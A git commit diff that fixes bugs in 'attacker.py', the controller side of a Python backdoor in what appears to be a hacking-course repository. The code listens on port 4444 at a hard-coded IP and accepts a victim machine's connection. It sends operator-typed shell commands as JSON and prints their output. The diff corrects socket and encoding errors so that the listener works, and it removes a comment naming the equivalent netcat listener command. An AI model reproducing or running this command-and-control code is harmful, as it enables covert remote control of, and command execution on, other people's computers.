4857b0ad12a001f83d678a4d6da62f5d54076e2d
Melih Sunman <76569614+sunman54@users.noreply.github.com>
2024-01-11 20:52:18 +0300

    attacker bug fix

--- 11- Backdoor/attacker.py
+++ 11- Backdoor/attacker.py
@@ -2,29 +2,26 @@ import json
 import socket 
 from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
 
-# netcat alternative :  nc -vv -l -p 4444
-
-
 class Listener:
     def __init__(self, attacker_ip, port=4444):
         listener = socket.socket(AF_INET, SOCK_STREAM)
-        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR)
+        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
         listener.bind((attacker_ip, port))
         listener.listen(0)
-        print('[+] Waiting for imcomming connections ...')
+        print('[+] Waiting for incoming connections ...')
 
         self.connection, address = listener.accept()
         print(f'[+] New connection from {address}')
 
     def send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(bytes(json_data, 'utf-8'))
 
     def receive(self):
         json_data = ''
         while True:
             try:
-                json_data += self.connection.recv(1024)
+                json_data += self.connection.recv(1024).decode('utf-8')
             except ValueError:
                 continue 
 
@@ -32,15 +29,12 @@ class Listener:
         self.send(command)
         return self.receive()
 
-
     def run(self):
         while True:
             command = input('>> ')
-            result = self.send_command()
+            result = self.execute_system_command(command)
             print(result)
 
-
-
 attacker_ip = "192.168.106.129"
-
 listener = Listener(attacker_ip, 4444)
+listener.run()
